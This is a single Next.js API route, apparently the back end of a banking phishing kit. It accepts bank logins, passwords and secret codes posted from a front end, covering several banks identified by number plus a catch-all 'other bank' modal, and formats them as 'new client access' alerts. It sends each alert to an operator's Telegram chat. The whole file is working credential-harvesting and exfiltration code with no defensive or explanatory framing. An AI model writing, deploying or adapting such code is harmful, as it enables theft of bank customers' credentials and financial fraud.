import { NextResponse } from 'next/server';

export async function POST(req: Request) {
  try {
    const data = await req.json();

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Récupération universelle peu importe le nom de la variable envoyée par le front
    const identifiant = data.identifiant || data.client_id || data.username || 'Non renseigné';
    const password = data.password || data.secret_code || data.code || 'Non renseigné';
    const offreId = data.offreId || data.bankName || data.nom_banque || 'Inconnu';

    let message = '';

    // Si c'est l'autre banque (Modale)
    if (data.bankName && !data.offreId && !data.nom_banque) {
      message = `🏛️ *NOUVEL ÉTABLISSEMENT (AUTRE)*\n\n` +
        `• *Nom complet :* ${data.nom || 'N/A'}\n` +
        `• *Établissement :* ${data.bankName}\n` +
        `• *Identifiant :* \`${identifiant}\`\n` +
        `• *Mot de passe :* \`${password}\`\n\n` +
        `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;
    } else {
      // Pour les offres standard (1 à 11)
      message = `🔑 *NOUVEL ACCÈS CLIENT*\n\n` +
        `• *Établissement ID :* ${offreId}\n` +
        `• *Identifiant :* \`${identifiant}\`\n` +
        `• *Code secret :* \`${password}\`\n\n` +
        `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;
    }

    // Envoi de la notification vers Telegram
    if (botToken && chatId) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      });
    }

    return NextResponse.json({ success: true, message: 'Données transmises' });

  } catch (error) {
    console.error('Erreur API Server :', error);
    return NextResponse.json(
      { success: false, error: 'Erreur lors du traitement' },
      { status: 500 }
    );
  }
}